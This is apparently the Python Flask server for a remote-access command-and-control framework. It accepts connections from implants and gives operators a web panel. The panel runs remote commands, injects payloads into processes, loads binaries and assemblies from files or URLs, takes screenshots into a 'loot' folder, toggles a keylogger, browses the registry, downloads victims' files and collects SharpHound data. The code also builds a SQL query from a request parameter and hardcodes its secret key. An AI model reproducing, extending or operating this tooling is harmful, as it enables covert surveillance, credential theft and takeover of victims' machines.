
from gzip import READ
import time,datetime
from os import close
import os,ctypes
 
import re
import socket
import threading,time,flask
from flask import *
from pathlib import Path
import base64
import time,random,string 
import zipfile
from flask_wtf import FlaskForm
from wtforms import StringField
from MyForms import *
from flask_session import Session
from flask_sqlalchemy import SQLAlchemy
from Checks import *
from flask_bcrypt import Bcrypt
from flask_login import LoginManager,login_user,logout_user,current_user,login_required
import sqlite3

ip_address = '0.0.0.0'
port_number = 1234

thread_index = 0
THREADS = []
CMD_INPUT = []
FILE_INPUT = []
CMD_OUTPUT = []
FILE_OUTPUT=[]
REG_INPUT=[]
REG_OUTPUT=[]
IPS = []
CWD=[]
BUFFER_SIZE = 4096*10
TO_DOWNLOAD=[]
CURRENT_WORKING_DIR = "D:\\python\\c2_yt"
GOT_OUTPUT = 0
CURRENT_REGISTRY_PATH = []
LOAD_INPUT=[]
LOAD_OUTPUT=[]

for i in range(50):
    #THREADS.append('')
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    FILE_INPUT.append('')
    FILE_OUTPUT.append('')
    IPS.append('')
    CWD.append('.')
    TO_DOWNLOAD.append('')
    REG_INPUT.append('')
    REG_OUTPUT.append('')
    CURRENT_REGISTRY_PATH.append('')
    LOAD_INPUT.append('')
    LOAD_OUTPUT.append('')

app = Flask(__name__)
app.secret_key = 'blahblahblah'
app.config['SESSION_PERMANENT'] = False
app.config["SESSION_TYPE"]="filesystem"
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///databases/main.db"
Session(app)
db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
login_manager = LoginManager(app)
login_manager.init_app(app)
login_manager.login_view = 'login'

@login_manager.user_loader
def load_user(user_id):
    return MyDBS.Login.query.get(user_id)

def close_connection(connection,thread_index):
    connection.close() 
    THREADS.remove(THREADS[thread_index])
    IPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''

def handle_connection(connection,address,thread_index):
    global CMD_OUTPUT
    global CMD_INPUT
    global FILE_INPUT
    global FILE_OUTPUT
    global CWD
    global TO_DOWNLOAD
    
    while CMD_INPUT[thread_index]!='quit':
        #connection.settimeout(5)
        if CMD_INPUT[thread_index]=="powerup":
            time.sleep(5)
        msg = connection.recv(10240000).decode()
        #print("length of message is "+str(len(msg)))
        #while len(msg)==0 or msg!="Hello World":
            #msg = connection.recv(BUFFER_SIZE).decode()
        CMD_OUTPUT[thread_index] = msg
        while True:
            if LOAD_INPUT[thread_index]!='' or CMD_INPUT[thread_index]!='' or FILE_INPUT[thread_index]!='' or TO_DOWNLOAD[thread_index]!='' or REG_INPUT[thread_index]!='':

                if "Inject-" in CMD_INPUT[thread_index]:
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename = cmd.split("-")[1]
                    processname = cmd.split("-")[-1]
                    fd = open("output\\{}".format(filename),'rb')
                    content = fd.read()
                    fd.close()
                    connection.send(content)
                    CMD_OUTPUT[thread_index]=connection.recv(2048).decode()
                    CMD_INPUT[thread_index]=""

                elif TO_DOWNLOAD[thread_index]!='':
                    # download-lengthoffiles
                    downloads = TO_DOWNLOAD[thread_index]
                    msg="download-"+str(len(downloads))+"-"+CWD[thread_index][0:-1]
                    #print(address)
                    connection.send(msg.encode())
                    #print("sent to client")
                    time.sleep(2)
                    for i in range(len(downloads)):
                        connection.send(downloads[i].encode())
                        filecontents = connection.recv(BUFFER_SIZE*1000)
                        f = open(downloads[i],'wb')
                        f.write(filecontents)
                        f.close()
                    msg = connection.recv(BUFFER_SIZE)
                    CMD_OUTPUT[thread_index]=msg
                    TO_DOWNLOAD[thread_index]=''

                elif REG_INPUT[thread_index]!='':
                    # getregistry-inputhere
                    cmd = "getregistry-" + REG_INPUT[thread_index]
                    connection.send(cmd.encode())
                    REG_OUTPUT[thread_index] = connection.recv(BUFFER_SIZE*10).decode()
                    REG_INPUT[thread_index]=""

                elif LOAD_INPUT[thread_index]!='':
                    if LOAD_INPUT[thread_index][0:9]=="loadfile-" or LOAD_INPUT[thread_index][0:9]=="loadpe64-":
                        #print(LOAD_INPUT[thread_index])
                        # we need to send file contents in bytes
                        cmd = LOAD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        filepath = "output\\"+LOAD_INPUT[thread_index][9:]
                        print(filepath)
                        fd = open(filepath,'rb')
                        filecontent = fd.read()
                        fd.close()
                        connection.send(filecontent)
                        LOAD_OUTPUT[thread_index]=connection.recv(BUFFER_SIZE).decode()
                        LOAD_INPUT[thread_index]=''
                    elif LOAD_INPUT[thread_index][0:8]=="loadurl-":
                        # we need to send url of exe
                        print(LOAD_INPUT[thread_index])
                        cmd = LOAD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        LOAD_OUTPUT[thread_index]=connection.recv(BUFFER_SIZE).decode()
                        LOAD_INPUT[thread_index]=''

                
                elif FILE_INPUT[thread_index]!='':
                    # getdirectorycontents-directoryname
                    msg = "getdirectorycontents-"+FILE_INPUT[thread_index]
                    connection.send(msg.encode())
                    print(FILE_INPUT[thread_index])
                    msg = connection.recv(BUFFER_SIZE).decode()
                    GOT_OUTPUT=1
                    FILE_OUTPUT[thread_index] = msg
                    FILE_INPUT[thread_index]=''


                elif CMD_INPUT[thread_index]=="Get-Screenshot":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    encodedimage = connection.recv(BUFFER_SIZE*100).decode()
                    imagebytes = base64.b64decode(encodedimage)
                    ts = time.time()
                    timestamp = datetime.datetime.fromtimestamp(ts).strftime(r'%Y%m%d%H%M%S')
                    filename = "".join(address[0].split("."))+"-"+timestamp
                    f = open(".\\loot\\"+filename+".jpg","wb")
                    f.write(imagebytes)
                    f.close()
                    fullfilename =filename+".jpg"                    
                    #temp = threading.Thread(target=showimage,args=(fullfilename,))
                    #temp.start()
                    #chrome_path=r'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'
                    #webbrowser.register('chrome', None,webbrowser.BackgroundBrowser(chrome_path))
                    #webbrowser.get(chrome_path).open_new("https://google.com")
                    CMD_OUTPUT[thread_index] = fullfilename
                    CMD_INPUT[thread_index] = ""


                elif CMD_INPUT[thread_index].split(" ")[0]=='download':
                        #download filename
                        filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                        print(filename)
                        cmd = CMD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        connection.settimeout(7)
                        contents = connection.recv(BUFFER_SIZE*10000) 
                        connection.settimeout(None)
                        f = open(filename,'wb')
                        f.write(base64.b64decode(contents))
                        f.close()
                        #time.sleep(3)
                        CMD_OUTPUT[thread_index]='File Transferred successfully'
                        CMD_INPUT[thread_index]=''
                        #break

                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                        #upload filename dest 2048
                        cmd = CMD_INPUT[thread_index]
                        filename = CMD_INPUT[thread_index].split(" ")[1]
                        filesize = os.path.getsize('.\\output\\'+filename)
                        filesize += 1024
                        print(filesize)
                        CMD_INPUT[thread_index] += " "+str(filesize)
                        print(CMD_INPUT[thread_index])
                        connection.send(CMD_INPUT[thread_index].encode())
                        
                        destination = CMD_INPUT[thread_index].split(" ")[2]
                        #filesize = CMD_INPUT[thread_index].split(" ")[3]
                        
                        f = open('.\\output\\'+filename,'rb')
                        contents = f.read()
                        f.close()
                        connection.send(contents)
                        connection.settimeout(7)
                        msg = connection.recv(2048).decode()
                        connection.settimeout(None)
                        if msg =='got file':
                            CMD_OUTPUT[thread_index] = 'File Sent Successfully'
                            CMD_INPUT[thread_index]=''
                        else:
                            CMD_OUTPUT[thread_index]='Some Error Occurred'
                            CMD_INPUT[thread_index]='' 
                
                elif CMD_INPUT[thread_index]=="Get-SharpHoundZip":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    #connection.settimeout(11)
                    contents = connection.recv(BUFFER_SIZE*5) 
                    print(len(contents))
                    #print(str(contents))
                    #connection.settimeout(None)
                    #print(len(contents))
                    #filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    filename = "testingsharphound"
                    fd = open(".\\"+filename+".zip",'wb')
                    fd.write(contents)
                    fd.close()
                    #zf = zipfile.ZipFile(filename+".zip",'w')
                    #zf.wrirtestr(filename+".zip",contents)
                    #zf.close()
                    #time.sleep(3)
                    contents2= connection.recv(BUFFER_SIZE)
                    #CMD_OUTPUT[thread_index]='File Transferred successfully'
                    CMD_INPUT[thread_index]=''


                elif CMD_INPUT[thread_index] == "keylog on":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''
                
                elif CMD_INPUT[thread_index]=='keylog off':
                    cmd =CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''

                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    if msg=='quit':
                        CMD_INPUT[thread_index]='quit'
                    else:
                        CMD_INPUT[thread_index]=''
                    #msg = connection.recv(BUFFER_SIZE).decode()
                    #CMD_OUTPUT[thread_index] = msg
                    break
            
            
    close_connection(connection,thread_index)


    
def server_socket():
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((ip_address,port_number))
    ss.listen(5)
    #def init_server():
    global THREADS
    global IPS
    while True:
        connection , address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection,args=(connection,address,len(THREADS)))
        t.name = t.name.split(" ")[0]
        THREADS.append(t)
        IPS[thread_index]=address
        t.start()


@app.before_first_request
def init_server():
    s1 = threading.Thread(target=server_socket)
    s1.start()

@app.route("/<agentname>/stuff")
def random(agentname):
    try:
        for i in THREADS:
                if agentname in i.name:
                    temp = THREADS.index(i)
        cmdoutput = CMD_OUTPUT[temp]
        return jsonify(result=cmdoutput)
    except:
        return render_template('index.html')


@app.route("/")
@app.route('/home')
def home():
    return render_template('index.html')


@app.route("/agents")
@login_required
def agents():
    
    #print(THREADS)
    return render_template('agents.html',threads=THREADS,ips=IPS)


@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    command = Command()
    return render_template("execute.html",name=agentname,command =command)


@app.route("/<agentname>/execute",methods=['GET','POST'])
def execute(agentname):
    command = Command()
    
    if request.method=='GET':
        counter = 0
        cmd = request.args.get('d')
        # Get-SharpHoundZip
        print(cmd)
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        prev = CMD_OUTPUT[req_index]
        #print("previous value->"+prev)
        CMD_INPUT[req_index]=cmd
        #time.sleep(2)
        if cmd=="Get-SharpHoundZip":
            CMD_OUTPUT[req_index]="Trying to initiate transfer... If you get incorrect or less data, run it again"
            #time.sleep(3)
            cmdoutput = CMD_OUTPUT[req_index]
            return render_template("execute.html",name=agentname,cmdoutput=cmdoutput,command=command)
        #time.sleep(5)
        if cmd=="powerup":
            time.sleep(20)
        while (prev==CMD_OUTPUT[req_index] and counter<10) or prev=="Hello World":
            time.sleep(0.5)
            counter+=1
        if counter>1:
            cmdoutput = CMD_OUTPUT[req_index]
            #counter = 0
        cmdoutput = CMD_OUTPUT[req_index]
        #print("Latest value->"+cmdoutput)
        return render_template("execute.html",name=agentname,cmdoutput=cmdoutput,command=command)
    if request.method=='POST':
        cmd = request.form['command']
        counter = 0
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        prev = CMD_OUTPUT[req_index]
        CMD_INPUT[req_index]=cmd
        if CMD_INPUT[req_index].split(" ")[0] in ["download","upload"]:
            time.sleep(6)
        time.sleep(1)
        cmdoutput = CMD_OUTPUT[req_index]
        while (prev==CMD_OUTPUT[req_index] and counter<10) or prev=="Hello World":
            time.sleep(0.5)
            counter+=1
        if counter>0:
            cmdoutput = CMD_OUTPUT[req_index]
            counter=0
        return ('',204)
        #return Response(status=200)
        #return render_template('execute.html',cmdoutput=cmdoutput,name=agentname,ips=IPS)


#@app.route("/<agentname>")


#testing lmao
@app.route("/temp",methods=['GET','POST'])
@login_required
def temp():
    l =[['D',"test"],['F', 'LICENSE.txt'], ['F', 'NEWS.txt'], ['F', 'python.exe'], ['F', 'python3.dll'], ['F', 'python39.dll'], ['F', 'pythonw.exe'], ['F', 'vcruntime140.dll'], ['F', 'vcruntime140_1.dll']]
    if request.method=="POST":
        print(request.form.getlist("checkbox2"))
    return render_template("checkbox.html",cwd=os.getcwd(),data=l)


@app.route("/temp/<dirname>",methods=["GET","POST"])
def tempup(dirname):
    #print(CURRENT_WORKING_DIR)
    directory_name = request.args.get('data')
    if (request.args.get('data')=="D:" or request.args.get('data')=="D:\\") and dirname=="up":
        CURRENT_WORKING_DIR = "D:\\"
        files = os.listdir(CURRENT_WORKING_DIR)
        #print(files)
        l=[]
        for i in range(len(files)):
            if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
                l.append(["D",files[i]])
            else:
                l.append(["F",files[i]])
        print(l)
        return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)
    
    if dirname=="up":
        CURRENT_WORKING_DIR = directory_name
        CURRENT_WORKING_DIR = "\\".join(CURRENT_WORKING_DIR.split("\\")[0:-1])
        files = os.listdir(CURRENT_WORKING_DIR)
        #print(files)
        l=[]
        for i in range(len(files)):
            if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
                l.append(["D",files[i]])
            else:
                l.append(["F",files[i]])
        print(l)
        return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)    
    l = []
    CURRENT_WORKING_DIR = request.args.get('data') + "\\"+dirname
    files = os.listdir(CURRENT_WORKING_DIR)
    print(files)
    l=[]
    for i in range(len(files)):
        if os.path.isdir(CURRENT_WORKING_DIR+"\\"+files[i]):
            l.append(["D",files[i]])
        else:
            l.append(["F",files[i]])
    print(l)
    return render_template("checkbox.html",cwd=CURRENT_WORKING_DIR,data=l)


@app.route("/<agentname>/file-manager",methods=["GET","POST"])
def filemanager(agentname): 
    for i in THREADS:
        if agentname in i.name:
            req_index = THREADS.index(i)
    if request.args.get('data'):
        #print("previous dir"+CWD[req_index])
        #print(str(request.args.get('data')))
        
        FILE_INPUT[req_index] = CWD[req_index][0:-1 ]  +"\\"+ str(request.args.get('data'))
        print("latest input "+FILE_INPUT[req_index])
    elif request.args.get('indexing'):
        indexing = int(request.args.get('indexing'))
        temp = CWD[req_index].split("\\")
        path1=""
        for i in range(0,indexing+1):
            path1+=temp[i]+"\\"
        print("path is "+path1)
        CWD[req_index] = path1
        FILE_INPUT[req_index] = path1
    else:
        FILE_INPUT[req_index]="."
    #cwd = FILE_INPUT[req_index] = "."
    time.sleep(1)
    print(FILE_OUTPUT[req_index])
    fileoutput = FILE_OUTPUT[req_index].split('\n')
    print(fileoutput[0])
    CWD[req_index] = fileoutput[0]
    fileoutput = fileoutput[1:]
    for i in range(len(fileoutput)):
        fileoutput[i]=list(fileoutput[i].split("->"))
    #print(CWD[req_index].split("\\"))
    return render_template("filemanager.html",cwd=CWD[req_index],fileoutput=fileoutput,agentname=agentname)
    #pass 
 


@app.route("/<agentname>/downloadfiles",methods=["GET","POST"])
def downloadfiles(agentname):
    for i in THREADS:
        if agentname in i.name:
            req_index = THREADS.index(i)
    #print(req_index)
    filenames = request.args.getlist("checkbox2")
    cwd = request.args.get('cwd')
    
    for i in range(len(filenames)):
        filenames[i] = filenames[i].replace("\r\n","")
    print(filenames)
    TO_DOWNLOAD[req_index] = filenames
    fileoutput = FILE_OUTPUT[req_index].split('\n')
    print(fileoutput[0])
    CWD[req_index] = fileoutput[0]
    fileoutput = fileoutput[1:]
    for i in range(len(fileoutput)):
        fileoutput[i]=list(fileoutput[i].split("->"))
    return render_template("filemanager.html",cwd=CWD[req_index],agentname=agentname,fileoutput=fileoutput)


@app.route("/<agentname>/registrymanager",methods=["GET","POST"])
def registrymanager(agentname):
    for i in THREADS:
        if agentname in i.name:
            req_index = THREADS.index(i)
    hives = ["HKCR","HKCU","HKLM","HKUSERS","HKCURRENT_CONFIG"]
    cmdoutput = hives
    if request.args.get("d"):
        regkey = request.args.get("d")
        print(regkey)
        CURRENT_REGISTRY_PATH[req_index] +="\\"+ regkey
        #CURRENT_REGISTRY_PATH[req_index]=CURRENT_REGISTRY_PATH[req_index][1:]
        if CURRENT_REGISTRY_PATH[req_index][0]=="\\":
            CURRENT_REGISTRY_PATH[req_index] = CURRENT_REGISTRY_PATH[req_index][1:]
        REG_INPUT[req_index]=CURRENT_REGISTRY_PATH[req_index]
        time.sleep(2)
        cmdoutput = REG_OUTPUT[req_index]
        print(cmdoutput)
    if request.args.get("change"):
        goingup =request.args.get("change")
        print(goingup)
        print(CURRENT_REGISTRY_PATH[req_index])
        temp = CURRENT_REGISTRY_PATH[req_index].split("\\")
        temppath = ""
        for i in range(len(temp)):
            if temp[i]==goingup:
                temppath+=goingup
                break
                #temppath+=temp[i]+"\\"
            else:
                temppath+=temp[i]+"\\"    
        if temppath=="" or temppath=="\\":
            cmdoutput=hives
        else:
            if temppath[0]=="\\":
                temppath = temppath[1:]
            print(temppath)
            CURRENT_REGISTRY_PATH[req_index]=temppath
            REG_INPUT[req_index]=temppath
            time.sleep(1)
    if REG_OUTPUT[req_index]:
        cmdoutput = REG_OUTPUT[req_index]
        cmdoutput = cmdoutput.split("\n")
        REG_OUTPUT[req_index]=""
    if CURRENT_REGISTRY_PATH[req_index]=="":
        path="\\"
    else:
        path = CURRENT_REGISTRY_PATH[req_index]
    print(CURRENT_REGISTRY_PATH[req_index])
    return render_template("registrymanager.html",cmdoutput=cmdoutput,agentname=agentname,path=path)



@app.route("/<agentname>/loadassembly",methods=["GET","POST"])
def loadassembly(agentname):
    for i in THREADS:
        if agentname in i.name:
            req_index = THREADS.index(i)
    if request.method=="POST":
        #print(request.form.get("myfiles"))
        if request.form.get("myfiles"):
            filename = request.form.get("myfiles")
            LOAD_INPUT[req_index] = "loadfile-"+filename
        elif request.form.get("url"):
            url = request.form.get("url")
            LOAD_INPUT[req_index] = "loadurl-"+url
    time.sleep(1)
    cmdoutput = LOAD_OUTPUT[req_index]
    return render_template('loadassembly.html',agentname=agentname)
    


@app.route("/<agentname>/misc",methods=["GET","POST"])
def misc(agentname):
    for i in range(len(THREADS)):
        if agentname in THREADS[i].name:
            cmd_index = THREADS.index(THREADS[i])
    if request.args.get('cmd')!=None:
        cmd = request.args.get('cmd')
        CMD_INPUT[cmd_index] = cmd
        time.sleep(2)
        status = CMD_OUTPUT[cmd_index]
        if cmd=="Get-Screenshot":
            pic=status
            return render_template("misc.html",agentname=agentname,status=status,pic=pic)
        
        return render_template("misc.html",agentname=agentname,status=status)

    return render_template("misc.html",agentname=agentname)
    

@app.route("/loot/<imagename>")
@login_required
def send(imagename):
    return send_from_directory("loot",imagename)

'''@app.route("/<agentname>/injectshellcode",method=["GET","POST"])
def injectshellcode(agentname):
    print("hi")
    #pass'''



@app.route("/<agentname>/LoadPE64",methods=["GET","POST"])
@login_required
def loadpe64(agentname):
    for i in THREADS:
        if agentname in i.name:
            req_index = THREADS.index(i)
    if request.form.get("myfiles"):
        filename = request.form.get("myfiles")
        LOAD_INPUT[req_index] = "loadpe64-"+filename
    cmdoutput = CMD_OUTPUT[req_index]
    return render_template("loadassembly.html",cmdoutput=cmdoutput,agentname=agentname)



@app.route("/login",methods=["GET","POST"])
def login():
    #if session['name']:
        #return redirect('/home')
    loginform = Login()
    if request.method=="POST":  
        username1 = request.form.get('username')
        password1 = request.form.get('password')
        if loginform.validate_on_submit():
            #print("login successful")
            userobject = MyDBS.Login.query.filter_by(username=loginform.username.data).first()
            if userobject and bcrypt.check_password_hash(userobject.password,loginform.password.data):
                print("login successful")
                #current_user.isauthenticated = True
                login_user(userobject,True)
                #print("logged in")
                return redirect(url_for('agents'))
            else:
                status = "Invalid Credentials"
                loginform = Login()
                return render_template("login.html",form=loginform,status=status)
        else:
            status = loginform.errors.items()
            print(status)
            loginform = Login()
            return render_template("login.html",form=loginform,status=status)  
    loginform = Login()
    
    return render_template("login.html",form=loginform)


@app.route("/logout")
@login_required
def logout():
    logout_user()
    
    #session.clear()
    return redirect("/home")


import MyDBS
@app.route("/register",methods=["GET","POST"])
def register():
    
    if request.method=="POST":
        registerform = Register()
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        confirm_password = request.form.get('confirm_password')
        if registerform.validate_on_submit():
            userexists = MyDBS.Login.query.filter_by(username=registerform.username.data).first()
            emailexists = MyDBS.Login.query.filter_by(email=registerform.email.data).first()
            if userexists:
                status = "Choose another username"
                return render_template("register.html",regform=registerform,status=status)
            if emailexists:
                status = "Choose another email"
                return render_template("register.html",regform=registerform,status=status)
            hash = bcrypt.generate_password_hash(registerform.password.data)
            user = MyDBS.Login(email=registerform.email.data,username=registerform.username.data,password=hash)
            db.session.add(user)
            db.session.commit()
            status = "Account Created Successfully"
            print(status)
        else:
            print(registerform.errors)
            #status = "wrong"
            status = registerform.errors.values()
        #status = Validate(username,email,password,confirm_password)
        return render_template("register.html",regform=registerform,status=status)
    registerform = Register()
    return render_template("register.html",regform=registerform)


@app.route("/cheatsheet",methods=["GET","POST"])
def cheatsheet():
    try:
        connector = sqlite3.connect("D:\\my_notes_db\\notes.db")
        cursor = connector.cursor()
        table_name = "windows_privesc"
        if request.args.get('tablename'):
            table_name = request.args.get('tablename')
        data2 = cursor.execute("SELECT * FROM '{}';".format(table_name)).fetchall()
        tables = cursor.execute("SELECT name from sqlite_master where type='table';").fetchall()
        newtables = []
        for i in tables:
            for j in i:
                newtables.append(j)
        headers = cursor.execute("Select * from '{}';".format(table_name))
        theaders = []
        data1 = []
        for i in headers.description:
            theaders.append(i[0])
        #print(theaders)
        cursor.close()
        connector.close()
        newtables.sort()
    except:
        return render_template("notesdb.html")
    return render_template("notesdb.html",data=data2,theaders=theaders,tables=newtables,table_name=table_name)



@app.route("/<agentname>/processes",methods=["GET","POST"])
def processes(agentname):
    for i in THREADS:
        if agentname in i.name:
            req_index = THREADS.index(i)
    CMD_INPUT[req_index] = "Get-Processes"
    time.sleep(2)
    data=str(CMD_OUTPUT[req_index]).split("\n")
    print(data)
    ffield = filefield1()
    if  request.method=="POST":
        CMD_INPUT[req_index] = "Get-Processes"
        time.sleep(1)
        data=str(CMD_OUTPUT[req_index]).split("\n")
        print(request.form)
        filetoinject= request.form.get('fileselector')
        pname = request.args.get('pname')
        fname = filetoinject
        CMD_INPUT[req_index]="Inject-{}-{}".format(fname,pname)
        time.sleep(1)
        status = CMD_OUTPUT[req_index]
        return render_template("processes.html",data=data,filefield=ffield,pname=pname,fname=fname,agentname=agentname,status=status)
    return render_template("processes.html",data=data,filefield=ffield,agentname=agentname)
    


@app.route("/misc")
@login_required
def misc2():
    return render_template("misc.html")

if __name__=='__main__':
    app.run(debug=True)

